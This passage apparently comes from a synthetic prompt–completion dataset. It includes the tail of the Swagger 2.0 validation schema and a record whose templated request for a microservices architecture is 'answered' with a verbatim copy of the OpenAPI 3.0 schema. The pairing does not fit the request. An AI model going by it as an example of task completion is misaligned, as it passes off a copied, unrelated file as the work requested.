\"boolean\",\n          \"default\": false\n        },\n        \"wrapped\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      }\n    },\n    \"tag\": {\n      \"type\": \"object\",\n      \"additionalProperties\": false,\n      \"required\": [\n        \"name\"\n      ],\n      \"properties\": {\n        \"name\": {\n          \"type\": \"string\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"externalDocs\": {\n          \"$ref\": \"#/definitions/externalDocs\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      }\n    },\n    \"securityDefinitions\": {\n      \"type\": \"object\",\n      \"additionalProperties\": {\n        \"oneOf\": [\n          {\n            \"$ref\": \"#/definitions/basicAuthenticationSecurity\"\n          },\n          {\n            \"$ref\": \"#/definitions/apiKeySecurity\"\n          },\n          {\n            \"$ref\": \"#/definitions/oauth2ImplicitSecurity\"\n          },\n          {\n            \"$ref\": \"#/definitions/oauth2PasswordSecurity\"\n          },\n          {\n            \"$ref\": \"#/definitions/oauth2ApplicationSecurity\"\n          },\n          {\n            \"$ref\": \"#/definitions/oauth2AccessCodeSecurity\"\n          }\n        ]\n      }\n    },\n    \"basicAuthenticationSecurity\": {\n      \"type\": \"object\",\n      \"additionalProperties\": false,\n      \"required\": [\n        \"type\"\n      ],\n      \"properties\": {\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"basic\"\n          ]\n        },\n        \"description\": {\n          \"type\": \"string\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      }\n    },\n    \"apiKeySecurity\": {\n      \"type\": \"object\",\n      \"additionalProperties\": false,\n      \"required\": [\n        \"type\",\n        \"name\",\n        \"in\"\n      ],\n      \"properties\": {\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"apiKey\"\n          ]\n        },\n        \"name\": {\n          \"type\": \"string\"\n        },\n        \"in\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"header\",\n            \"query\"\n          ]\n        },\n        \"description\": {\n          \"type\": \"string\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      }\n    },\n    \"oauth2ImplicitSecurity\": {\n      \"type\": \"object\",\n      \"additionalProperties\": false,\n      \"required\": [\n        \"type\",\n        \"flow\",\n        \"authorizationUrl\"\n      ],\n      \"properties\": {\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"oauth2\"\n          ]\n        },\n        \"flow\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"implicit\"\n          ]\n        },\n        \"scopes\": {\n          \"$ref\": \"#/definitions/oauth2Scopes\"\n        },\n        \"authorizationUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      }\n    },\n    \"oauth2PasswordSecurity\": {\n      \"type\": \"object\",\n      \"additionalProperties\": false,\n      \"required\": [\n        \"type\",\n        \"flow\",\n        \"tokenUrl\"\n      ],\n      \"properties\": {\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"oauth2\"\n          ]\n        },\n        \"flow\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"password\"\n          ]\n        },\n        \"scopes\": {\n          \"$ref\": \"#/definitions/oauth2Scopes\"\n        },\n        \"tokenUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      }\n    },\n    \"oauth2ApplicationSecurity\": {\n      \"type\": \"object\",\n      \"additionalProperties\": false,\n      \"required\": [\n        \"type\",\n        \"flow\",\n        \"tokenUrl\"\n      ],\n      \"properties\": {\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"oauth2\"\n          ]\n        },\n        \"flow\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"application\"\n          ]\n        },\n        \"scopes\": {\n          \"$ref\": \"#/definitions/oauth2Scopes\"\n        },\n        \"tokenUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      }\n    },\n    \"oauth2AccessCodeSecurity\": {\n      \"type\": \"object\",\n      \"additionalProperties\": false,\n      \"required\": [\n        \"type\",\n        \"flow\",\n        \"authorizationUrl\",\n        \"tokenUrl\"\n      ],\n      \"properties\": {\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"oauth2\"\n          ]\n        },\n        \"flow\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"accessCode\"\n          ]\n        },\n        \"scopes\": {\n          \"$ref\": \"#/definitions/oauth2Scopes\"\n        },\n        \"authorizationUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri\"\n        },\n        \"tokenUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      }\n    },\n    \"oauth2Scopes\": {\n      \"type\": \"object\",\n      \"additionalProperties\": {\n        \"type\": \"string\"\n      }\n    },\n    \"mediaTypeList\": {\n      \"type\": \"array\",\n      \"items\": {\n        \"$ref\": \"#/definitions/mimeType\"\n      },\n      \"uniqueItems\": true\n    },\n    \"parametersList\": {\n      \"type\": \"array\",\n      \"description\": \"The parameters needed to send a valid API call.\",\n      \"additionalItems\": false,\n      \"items\": {\n        \"oneOf\": [\n          {\n            \"$ref\": \"#/definitions/parameter\"\n          },\n          {\n            \"$ref\": \"#/definitions/jsonReference\"\n          }\n        ]\n      },\n      \"uniqueItems\": true\n    },\n    \"schemesList\": {\n      \"type\": \"array\",\n      \"description\": \"The transfer protocol of the API.\",\n      \"items\": {\n        \"type\": \"string\",\n        \"enum\": [\n          \"http\",\n          \"https\",\n          \"ws\",\n          \"wss\"\n        ]\n      },\n      \"uniqueItems\": true\n    },\n    \"collectionFormat\": {\n      \"type\": \"string\",\n      \"enum\": [\n        \"csv\",\n        \"ssv\",\n        \"tsv\",\n        \"pipes\"\n      ],\n      \"default\": \"csv\"\n    },\n    \"collectionFormatWithMulti\": {\n      \"type\": \"string\",\n      \"enum\": [\n        \"csv\",\n        \"ssv\",\n        \"tsv\",\n        \"pipes\",\n        \"multi\"\n      ],\n      \"default\": \"csv\"\n    },\n    \"title\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/title\"\n    },\n    \"description\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/description\"\n    },\n    \"default\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/default\"\n    },\n    \"multipleOf\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/multipleOf\"\n    },\n    \"maximum\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/maximum\"\n    },\n    \"exclusiveMaximum\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/exclusiveMaximum\"\n    },\n    \"minimum\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/minimum\"\n    },\n    \"exclusiveMinimum\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/exclusiveMinimum\"\n    },\n    \"maxLength\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/definitions/positiveInteger\"\n    },\n    \"minLength\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/definitions/positiveIntegerDefault0\"\n    },\n    \"pattern\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/pattern\"\n    },\n    \"maxItems\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/definitions/positiveInteger\"\n    },\n    \"minItems\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/definitions/positiveIntegerDefault0\"\n    },\n    \"uniqueItems\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/uniqueItems\"\n    },\n    \"enum\": {\n      \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/enum\"\n    },\n    \"jsonReference\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"$ref\"\n      ],\n      \"additionalProperties\": false,\n      \"properties\": {\n        \"$ref\": {\n          \"type\": \"string\"\n        }\n      }\n    }\n  }\n}", "metadata": {"source": "github.com/spec-first/connexion", "file_path": "connexion/resources/schemas/v2.0/schema.json", "language": "json", "complexity": "complex", "star_count": 4553, "quality_score": 0.53, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 1591}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "{\n  \"id\": \"https://spec.openapis.org/oas/3.0/schema/2019-04-02\",\n  \"$schema\": \"http://json-schema.org/draft-04/schema#\",\n  \"description\": \"Validation schema for OpenAPI Specification 3.0.X.\",\n  \"type\": \"object\",\n  \"required\": [\n    \"openapi\",\n    \"info\",\n    \"paths\"\n  ],\n  \"properties\": {\n    \"openapi\": {\n      \"type\": \"string\",\n      \"pattern\": \"^3\\\\.0\\\\.\\\\d(-.+)?$\"\n    },\n    \"info\": {\n      \"$ref\": \"#/definitions/Info\"\n    },\n    \"externalDocs\": {\n      \"$ref\": \"#/definitions/ExternalDocumentation\"\n    },\n    \"servers\": {\n      \"type\": \"array\",\n      \"items\": {\n        \"$ref\": \"#/definitions/Server\"\n      }\n    },\n    \"security\": {\n      \"type\": \"array\",\n      \"items\": {\n        \"$ref\": \"#/definitions/SecurityRequirement\"\n      }\n    },\n    \"tags\": {\n      \"type\": \"array\",\n      \"items\": {\n        \"$ref\": \"#/definitions/Tag\"\n      },\n      \"uniqueItems\": true\n    },\n    \"paths\": {\n      \"$ref\": \"#/definitions/Paths\"\n    },\n    \"components\": {\n      \"$ref\": \"#/definitions/Components\"\n    }\n  },\n  \"patternProperties\": {\n    \"^x-\": {\n    }\n  },\n  \"additionalProperties\": false,\n  \"definitions\": {\n    \"Reference\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"$ref\"\n      ],\n      \"patternProperties\": {\n        \"^\\\\$ref$\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        }\n      }\n    },\n    \"Info\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"title\",\n        \"version\"\n      ],\n      \"properties\": {\n        \"title\": {\n          \"type\": \"string\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"termsOfService\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        },\n        \"contact\": {\n          \"$ref\": \"#/definitions/Contact\"\n        },\n        \"license\": {\n          \"$ref\": \"#/definitions/License\"\n        },\n        \"version\": {\n          \"type\": \"string\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"Contact\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"type\": \"string\"\n        },\n        \"url\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        },\n        \"email\": {\n          \"type\": \"string\",\n          \"format\": \"email\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"License\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"name\"\n      ],\n      \"properties\": {\n        \"name\": {\n          \"type\": \"string\"\n        },\n        \"url\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"Server\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"url\"\n      ],\n      \"properties\": {\n        \"url\": {\n          \"type\": \"string\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"variables\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"#/definitions/ServerVariable\"\n          }\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"ServerVariable\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"default\"\n      ],\n      \"properties\": {\n        \"enum\": {\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n          }\n        },\n        \"default\": {\n          \"type\": \"string\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"Components\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"schemas\": {\n          \"type\": \"object\",\n          \"patternProperties\": {\n            \"^[a-zA-Z0-9\\\\.\\\\-_]+$\": {\n              \"oneOf\": [\n                {\n                  \"$ref\": \"#/definitions/Schema\"\n                },\n                {\n                  \"$ref\": \"#/definitions/Reference\"\n                }\n              ]\n            }\n          }\n        },\n        \"responses\": {\n          \"type\": \"object\",\n          \"patternProperties\": {\n            \"^[a-zA-Z0-9\\\\.\\\\-_]+$\": {\n              \"oneOf\": [\n                {\n                  \"$ref\": \"#/definitions/Reference\"\n                },\n                {\n                  \"$ref\": \"#/definitions/Response\"\n                }\n              ]\n            }\n          }\n        },\n        \"parameters\": {\n          \"type\": \"object\",\n          \"patternProperties\": {\n            \"^[a-zA-Z0-9\\\\.\\\\-_]+$\": {\n              \"oneOf\": [\n                {\n                  \"$ref\": \"#/definitions/Reference\"\n                },\n                {\n                  \"$ref\": \"#/definitions/Parameter\"\n                }\n              ]\n            }\n          }\n        },\n        \"examples\": {\n          \"type\": \"object\",\n          \"patternProperties\": {\n            \"^[a-zA-Z0-9\\\\.\\\\-_]+$\": {\n              \"oneOf\": [\n                {\n                  \"$ref\": \"#/definitions/Reference\"\n                },\n                {\n                  \"$ref\": \"#/definitions/Example\"\n                }\n              ]\n            }\n          }\n        },\n        \"requestBodies\": {\n          \"type\": \"object\",\n          \"patternProperties\": {\n            \"^[a-zA-Z0-9\\\\.\\\\-_]+$\": {\n              \"oneOf\": [\n                {\n                  \"$ref\": \"#/definitions/Reference\"\n                },\n                {\n                  \"$ref\": \"#/definitions/RequestBody\"\n                }\n              ]\n            }\n          }\n        },\n        \"headers\": {\n          \"type\": \"object\",\n          \"patternProperties\": {\n            \"^[a-zA-Z0-9\\\\.\\\\-_]+$\": {\n              \"oneOf\": [\n                {\n                  \"$ref\": \"#/definitions/Reference\"\n                },\n                {\n                  \"$ref\": \"#/definitions/Header\"\n                }\n              ]\n            }\n          }\n        },\n        \"securitySchemes\": {\n          \"type\": \"object\",\n          \"patternProperties\": {\n            \"^[a-zA-Z0-9\\\\.\\\\-_]+$\": {\n              \"oneOf\": [\n                {\n                  \"$ref\": \"#/definitions/Reference\"\n                },\n                {\n                  \"$ref\": \"#/definitions/SecurityScheme\"\n                }\n              ]\n            }\n          }\n        },\n        \"links\": {\n          \"type\": \"object\",\n          \"patternProperties\": {\n            \"^[a-zA-Z0-9\\\\.\\\\-_]+$\": {\n              \"oneOf\": [\n                {\n                  \"$ref\": \"#/definitions/Reference\"\n                },\n                {\n                  \"$ref\": \"#/definitions/Link\"\n                }\n              ]\n            }\n          }\n        },\n        \"callbacks\": {\n          \"type\": \"object\",\n          \"patternProperties\": {\n            \"^[a-zA-Z0-9\\\\.\\\\-_]+$\": {\n              \"oneOf\": [\n                {\n                  \"$ref\": \"#/definitions/Reference\"\n                },\n                {\n                  \"$ref\": \"#/definitions/Callback\"\n                }\n              ]\n            }\n          }\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"Schema\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"title\": {\n          \"type\": \"string\"\n        },\n        \"multipleOf\": {\n          \"type\": \"number\",\n          \"minimum\": 0,\n          \"exclusiveMinimum\": true\n        },\n        \"maximum\": {\n          \"type\": \"number\"\n        },\n        \"exclusiveMaximum\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"minimum\": {\n          \"type\": \"number\"\n        },\n        \"exclusiveMinimum\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"maxLength\": {\n          \"type\": \"integer\",\n          \"minimum\": 0\n        },\n        \"minLength\": {\n          \"type\": \"integer\",\n          \"minimum\": 0,\n          \"default\": 0\n        },\n        \"pattern\": {\n          \"type\": \"string\",\n          \"format\": \"regex\"\n        },\n        \"maxItems\": {\n          \"type\": \"integer\",\n          \"minimum\": 0\n        },\n        \"minItems\": {\n          \"type\": \"integer\",\n          \"minimum\": 0,\n          \"default\": 0\n        },\n        \"uniqueItems\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"maxProperties\": {\n          \"type\": \"integer\",\n          \"minimum\": 0\n        },\n        \"minProperties\": {\n          \"type\": \"integer\",\n          \"minimum\": 0,\n          \"default\": 0\n        },\n        \"required\": {\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n          },\n          \"minItems\": 1,\n          \"uniqueItems\": true\n        },\n        \"enum\": {\n          \"type\": \"array\",\n          \"items\": {\n          },\n          \"minItems\": 1,\n          \"uniqueItems\": false\n        },\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"array\",\n            \"boolean\",\n            \"integer\",\n            \"number\",\n            \"object\",\n            \"string\"\n          ]\n        },\n        \"not\": {\n          \"oneOf\": [\n            {\n              \"$ref\": \"#/definitions/Schema\"\n            },\n            {\n              \"$ref\": \"#/definitions/Reference\"\n            }\n          ]\n        },\n        \"allOf\": {\n          \"type\": \"array\",\n          \"items\": {\n            \"oneOf\": [\n              {\n                \"$ref\": \"#/definitions/Schema\"\n              },\n              {\n                \"$ref\": \"#/definitions/Reference\"\n              }\n            ]\n          }\n        },\n        \"oneOf\": {\n          \"type\": \"array\",\n          \"items\": {\n            \"oneOf\": [\n              {\n                \"$ref\": \"#/definitions/Schema\"\n              },\n              {\n                \"$ref\": \"#/definitions/Reference\"\n              }\n            ]\n          }\n        },\n        \"anyOf\": {\n          \"type\": \"array\",\n          \"items\": {\n            \"oneOf\": [\n              {\n                \"$ref\": \"#/definitions/Schema\"\n              },\n              {\n                \"$ref\": \"#/definitions/Reference\"\n              }\n            ]\n          }\n        },\n        \"items\": {\n          \"oneOf\": [\n            {\n              \"$ref\": \"#/definitions/Schema\"\n            },\n            {\n              \"$ref\": \"#/definitions/Reference\"\n            }\n          ]\n        },\n        \"properties\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"oneOf\": [\n              {\n                \"$ref\": \"#/definitions/Schema\"\n              },\n              {\n                \"$ref\": \"#/definitions/Reference\"\n              }\n            ]\n          }\n        },\n        \"additionalProperties\": {\n          \"oneOf\": [\n            {\n              \"$ref\": \"#/definitions/Schema\"\n            },\n            {\n              \"$ref\": \"#/definitions/Reference\"\n            },\n            {\n              \"type\": \"boolean\"\n            }\n          ],\n          \"default\": true\n        },\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"format\": {\n          \"type\": \"string\"\n        },\n        \"default\": {\n        },\n        \"nullable\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"discriminator\": {\n          \"$ref\": \"#/definitions/Discriminator\"\n        },\n        \"readOnly\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"writeOnly\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"example\": {\n        },\n        \"externalDocs\": {\n          \"$ref\": \"#/definitions/ExternalDocumentation\"\n        },\n        \"deprecated\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"xml\": {\n          \"$ref\": \"#/definitions/XML\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"Discriminator\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"propertyName\"\n      ],\n      \"properties\": {\n        \"propertyName\": {\n          \"type\": \"string\"\n        },\n        \"mapping\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"type\": \"string\"\n          }\n        }\n      }\n    },\n    \"XML\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"type\": \"string\"\n        },\n        \"namespace\": {\n          \"type\": \"string\",\n          \"format\": \"uri\"\n        },\n        \"prefix\": {\n          \"type\": \"string\"\n        },\n        \"attribute\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"wrapped\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"Response\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"description\"\n      ],\n      \"properties\": {\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"headers\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"oneOf\": [\n              {\n                \"$ref\": \"#/definitions/Header\"\n              },\n              {\n                \"$ref\": \"#/definitions/Reference\"\n              }\n            ]\n          }\n        },\n        \"content\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"#/definitions/MediaType\"\n          }\n        },\n        \"links\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"oneOf\": [\n              {\n                \"$ref\": \"#/definitions/Link\"\n              },\n              {\n                \"$ref\": \"#/definitions/Reference\"\n              }\n            ]\n          }\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"MediaType\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"schema\": {\n          \"oneOf\": [\n            {\n              \"$ref\": \"#/definitions/Schema\"\n            },\n            {\n              \"$ref\": \"#/definitions/Reference\"\n            }\n          ]\n        },\n        \"example\": {\n        },\n        \"examples\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"oneOf\": [\n              {\n                \"$ref\": \"#/definitions/Example\"\n              },\n              {\n                \"$ref\": \"#/definitions/Reference\"\n              }\n            ]\n          }\n        },\n        \"encoding\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"#/definitions/Encoding\"\n          }\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false,\n      \"allOf\": [\n        {\n          \"$ref\": \"#/definitions/ExampleXORExamples\"\n        }\n      ]\n    },\n    \"Example\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"summary\": {\n          \"type\": \"string\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"value\": {\n        },\n        \"externalValue\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"Header\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"required\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"deprecated\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"allowEmptyValue\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"style\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"simple\"\n          ],\n          \"default\": \"simple\"\n        },\n        \"explode\": {\n          \"type\": \"boolean\"\n        },\n        \"allowReserved\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"schema\": {\n          \"oneOf\": [\n            {\n              \"$ref\": \"#/definitions/Schema\"\n            },\n            {\n              \"$ref\": \"#/definitions/Reference\"\n            }\n          ]\n        },\n        \"content\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"#/definitions/MediaType\"\n          },\n          \"minProperties\": 1,\n          \"maxProperties\": 1\n        },\n        \"example\": {\n        },\n        \"examples\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"oneOf\": [\n              {\n                \"$ref\": \"#/definitions/Example\"\n              },\n              {\n                \"$ref\": \"#/definitions/Reference\"\n              }\n            ]\n          }\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false,\n      \"allOf\": [\n        {\n          \"$ref\": \"#/definitions/ExampleXORExamples\"\n        },\n        {\n          \"$ref\": \"#/definitions/SchemaXORContent\"\n        }\n      ]\n    },\n    \"Paths\": {\n      \"type\": \"object\",\n      \"patternProperties\": {\n        \"^\\\\/\": {\n          \"$ref\": \"#/definitions/PathItem\"\n        },\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"PathItem\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"$ref\": {\n          \"type\": \"string\"\n        },\n        \"summary\": {\n          \"type\": \"string\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"servers\": {\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"#/definitions/Server\"\n          }\n        },\n        \"parameters\": {\n          \"type\": \"array\",\n          \"items\": {\n            \"oneOf\": [\n              {\n                \"$ref\": \"#/definitions/Parameter\"\n              },\n              {\n                \"$ref\": \"#/definitions/Reference\"\n              }\n            ]\n          },\n          \"uniqueItems\": true\n        }\n      },\n      \"patternProperties\": {\n        \"^(get|put|post|delete|options|head|patch|trace)$\": {\n          \"$ref\": \"#/definitions/Operation\"\n        },\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"Operation\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"responses\"\n      ],\n      \"properties\": {\n        \"tags\": {\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n          }\n        },\n        \"summary\": {\n          \"type\": \"string\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"externalDocs\": {\n          \"$ref\": \"#/definitions/ExternalDocumentation\"\n        },\n        \"operationId\": {\n          \"type\": \"string\"\n        },\n        \"parameters\": {\n          \"type\": \"array\",\n          \"items\": {\n            \"oneOf\": [\n              {\n                \"$ref\": \"#/definitions/Parameter\"\n              },\n              {\n                \"$ref\": \"#/definitions/Reference\"\n              }\n            ]\n          },\n          \"uniqueItems\": true\n        },\n        \"requestBody\": {\n          \"oneOf\": [\n            {\n              \"$ref\": \"#/definitions/RequestBody\"\n            },\n            {\n              \"$ref\": \"#/definitions/Reference\"\n            }\n          ]\n        },\n        \"responses\": {\n          \"$ref\": \"#/definitions/Responses\"\n        },\n        \"callbacks\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"oneOf\": [\n              {\n                \"$ref\": \"#/definitions/Callback\"\n              },\n              {\n                \"$ref\": \"#/definitions/Reference\"\n              }\n            ]\n          }\n        },\n        \"deprecated\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"security\": {\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"#/definitions/SecurityRequirement\"\n          }\n        },\n        \"servers\": {\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"#/definitions/Server\"\n          }\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"Responses\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"default\": {\n          \"oneOf\": [\n            {\n              \"$ref\": \"#/definitions/Response\"\n            },\n            {\n              \"$ref\": \"#/definitions/Reference\"\n            }\n          ]\n        }\n      },\n      \"patternProperties\": {\n        \"^[1-5](?:\\\\d{2}|XX)$\": {\n          \"oneOf\": [\n            {\n              \"$ref\": \"#/definitions/Response\"\n            },\n            {\n              \"$ref\": \"#/definitions/Reference\"\n            }\n          ]\n        },\n        \"^x-\": {\n        }\n      },\n      \"minProperties\": 1,\n      \"additionalProperties\": false\n    },\n    \"SecurityRequirement\": {\n      \"type\": \"object\",\n      \"additionalProperties\": {\n        \"type\": \"array\",\n        \"items\": {\n          \"type\": \"string\"\n        }\n      }\n    },\n    \"Tag\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"name\"\n      ],\n      \"properties\": {\n        \"name\": {\n          \"type\": \"string\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"externalDocs\": {\n          \"$ref\": \"#/definitions/ExternalDocumentation\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"ExternalDocumentation\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"url\"\n      ],\n      \"properties\": {\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"url\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"ExampleXORExamples\": {\n      \"description\": \"Example and examples are mutually exclusive\",\n      \"not\": {\n        \"required\": [\n          \"example\",\n          \"examples\"\n        ]\n      }\n    },\n    \"SchemaXORContent\": {\n      \"description\": \"Schema and content are mutually exclusive, at least one is required\",\n      